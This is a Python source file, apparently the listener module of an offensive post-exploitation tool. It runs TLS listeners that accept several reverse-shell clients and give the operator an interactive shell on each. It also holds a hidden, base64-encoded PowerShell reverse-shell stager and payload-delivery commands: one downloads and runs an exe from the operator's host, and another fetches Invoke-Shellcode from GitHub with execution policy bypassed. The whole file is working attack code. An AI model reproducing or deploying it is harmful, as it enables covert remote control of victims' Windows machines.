#!/usr/bin/python
import socket
import ssl
import random
import re
import sys
import os
import time
from threading import Thread
from main import *
from menu import *

def startBindListener(portnum,useProxy):
    try:
        bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bssl = ssl.wrap_socket(bs, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
        bssl.bind((FUNCTIONS().CheckInternet(), portnum))
        bssl.listen(1)

        if useProxy:
            bsp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bsp.bind(('127.0.0.1', 8888))
            bsp.listen(1)

    except:
        print t.bold_red + "[*] Error with listener - Port in use" + t.normal

    print t.bold_red + "listening on port %s"%portnum + t.normal

    bindClient, bindAddress = bssl.accept()
    bindIp, bindPort = bindAddress
    print t.bold_green + "connection from %s %s"%(bindIp, bindPort) + t.normal

    if useProxy:
        subprocess.Popen(['firefox','127.0.0.1:8888'])
        bindServer, bindServerAddress = bsp.accept()

    while bindClient:
        try:
            bindData = bindClient.recv(8000)
            if useProxy:
                bindServer.sendall(bindData)
                continue
            else:
                print bindData
        except:
            print t.bold_red + "connection closed from %s %s"%(bindIp, bindPort) + t.normal
            break

    if useProxy:
        bsp.close()
    bssl.close()


def startClientListener():
    time.sleep(0.25)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="AES256", certfile="server.crt", keyfile="server.key", server_side=True)
    except:
        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal + '\n>')
        sys.stdout.flush()
        sys.exit(1)
    try:
        ws.bind((FUNCTIONS().CheckInternet(), 5555))
        ws.listen(30)
    except:
        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal + '\n>')
        sys.stdout.flush()
        sys.exit(1)

    sys.stdout.write('\r' + t.bold_red + "listening on port 5555" + t.normal + '\n>')
    sys.stdout.flush()
    clientnumber = 0

    while True:
        clientconn, address = ws.accept()
        ip , port = address

        if clientconn:
            clientnumber += 1
            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n>')
            sys.stdout.flush()

            worker = Thread(target=pingClients, args=(clientconn,clientnumber))
            worker.setDaemon(True)
            worker.start()

        from menu import clientMenuOptions
        clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}

    ws.close()



def interactShell(clientconn,clientnumber):
    from menu import clientMenuOptions
    print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24

    while True:
        command = raw_input("PS > ")
        if command == "back":
            break
        elif command == "" or command == "\n":
            continue
        elif command == "exit":
            if str(clientnumber) in clientMenuOptions.keys():
                print t.bold_red + "Client Connection Killed" + t.normal
                del clientMenuOptions[str(clientnumber)]
                clientconn.close()
            break
        else:
            clientconn.sendall(command)

        while True:
            data = clientconn.recv(1)
            sys.stdout.write(data)
            sys.stdout.flush()
            if data == "\x00":
                data = ''
                break
    return True


def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
    if powershellExec:
        if isExe:
            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
            encPowershell = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 20;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
            encPowershell = base64.b64encode(encPowershell.encode('utf_16_le'))
            powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if ($Arch -eq 'x86') {powershell -exec bypass -enc \"%s\"}elseif ($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)

        clientconn.sendall(powershellExec)

    else:
        print type(fileToUpload)
        fileToUpload += '.exe'
        print t.bold_green + "[*] Starting Transfer" + t.normal
        ipaddr = FUNCTIONS().CheckInternet()
        FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload), port=8800)
        clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8800/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 25;Start-Process \"$Env:TEMP\\temp.exe\"")

def printListener():
    windows_powershell_stager = (
        "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
        "[byte[]]$b = 0..65535|%{0};"
        "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
        "$sl.AuthenticateAsClient($env:computername);"
        "while($c.Connected){"
        "$i = $sl.Read($b, 0, $b.Length);"
        "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i);"
        "$cb = (iex -c $d 2>&1 | Out-String);"
        "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length)};$c.Close()")

    print 'powershell.exe -WindowStyle Hidden -NonInteractive -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
    return True

def pingClients(clientconn,clientnumber):
    from menu import clientMenuOptions

    try:
        while True:
            time.sleep(15)
            clientconn.recv(1)
    except:
        if str(clientnumber) in clientMenuOptions.keys():
            print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
            del clientMenuOptions[str(clientnumber)]

        sys.exit(1)
